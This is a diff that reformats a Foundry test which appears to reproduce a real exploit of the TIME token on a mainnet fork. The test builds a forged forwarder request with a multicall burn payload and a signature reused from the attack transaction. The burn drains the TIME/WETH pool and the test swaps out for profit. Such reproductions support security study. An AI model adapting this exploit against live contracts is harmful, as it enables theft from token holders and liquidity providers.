@@ -23,14 +23,13 @@ interface IForwarder {
         bytes data;
     }
 
-    function execute(
-        ForwardRequest memory req,
-        bytes memory signature
-    ) external payable returns (bool, bytes memory);
+    function execute(ForwardRequest memory req, bytes memory signature) external payable returns (bool, bytes memory);
 }
 
 interface ITIME is IERC20 {
-    function burn(uint256 amount) external;
+    function burn(
+        uint256 amount
+    ) external;
 
     function multicall(
         bytes[] memory data
@@ -38,21 +37,15 @@ interface ITIME is IERC20 {
 }
 
 contract ContractTest is Test {
-    ITIME private constant TIME =
-        ITIME(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
-    IWETH private constant WETH =
-        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    Uni_Pair_V2 private constant TIME_WETH =
-        Uni_Pair_V2(0x760dc1E043D99394A10605B2FA08F123D60faF84);
-    Uni_Router_V2 private constant Router =
-        Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-    IForwarder private constant Forwarder =
-        IForwarder(0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81);
-    address private constant recoverAddr =
-        0xa16A5F37774309710711a8B4E83b068306b21724;
+    ITIME private constant TIME = ITIME(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
+    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    Uni_Pair_V2 private constant TIME_WETH = Uni_Pair_V2(0x760dc1E043D99394A10605B2FA08F123D60faF84);
+    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IForwarder private constant Forwarder = IForwarder(0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81);
+    address private constant recoverAddr = 0xa16A5F37774309710711a8B4E83b068306b21724;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 18730462);
+        vm.createSelectFork("mainnet", 18_730_462);
         vm.label(address(TIME), "TIME");
         vm.label(address(WETH), "WETH");
         vm.label(address(TIME_WETH), "TIME_WETH");
@@ -63,11 +56,7 @@ contract ContractTest is Test {
 
     function testExploit() public {
         deal(address(this), 5 ether);
-        emit log_named_decimal_uint(
-            "Exploiter ETH balance before attack",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Exploiter ETH balance before attack", address(this).balance, 18);
         TIME.approve(address(Router), type(uint256).max);
         WETH.approve(address(Router), type(uint256).max);
         WETH.deposit{value: 5 ether}();
@@ -75,24 +64,11 @@ contract ContractTest is Test {
 
         uint256 amountToBurn = 62_227_259_510 * 1e18;
         bytes[] memory datas = new bytes[](1);
-        datas[0] = abi.encodePacked(
-            TIME.burn.selector,
-            amountToBurn,
-            address(TIME_WETH)
-        );
-        bytes memory data = abi.encodeWithSelector(
-            TIME.multicall.selector,
-            datas
-        );
+        datas[0] = abi.encodePacked(TIME.burn.selector, amountToBurn, address(TIME_WETH));
+        bytes memory data = abi.encodeWithSelector(TIME.multicall.selector, datas);
 
-        IForwarder.ForwardRequest memory request = IForwarder.ForwardRequest({
-            from: recoverAddr,
-            to: address(TIME),
-            value: 0,
-            gas: 5e6,
-            nonce: 0,
-            data: data
-        });
+        IForwarder.ForwardRequest memory request =
+            IForwarder.ForwardRequest({from: recoverAddr, to: address(TIME), value: 0, gas: 5e6, nonce: 0, data: data});
 
         // Using signature from attack tx
         bytes32 messageHash = 0x2038560f9bee81aecd0fa852fae43c9e2a4db94c609c3b91dba5ac0f01b4d5c6;
@@ -110,11 +86,7 @@ contract ContractTest is Test {
         WETH.withdraw(WETH.balanceOf(address(this)));
 
         // In the end of attack tx also ~5 ether was transferred to Flashbot
-        emit log_named_decimal_uint(
-            "Exploiter ETH balance after attack",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Exploiter ETH balance after attack", address(this).balance, 18);
     }
 
     function WETHToTIME() internal {
@@ -122,11 +94,7 @@ contract ContractTest is Test {
         path[0] = address(WETH);
         path[1] = address(TIME);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WETH.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 
@@ -135,11 +103,7 @@ contract ContractTest is Test {
         path[0] = address(TIME);
         path[1] = address(WETH);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            TIME.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            TIME.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 
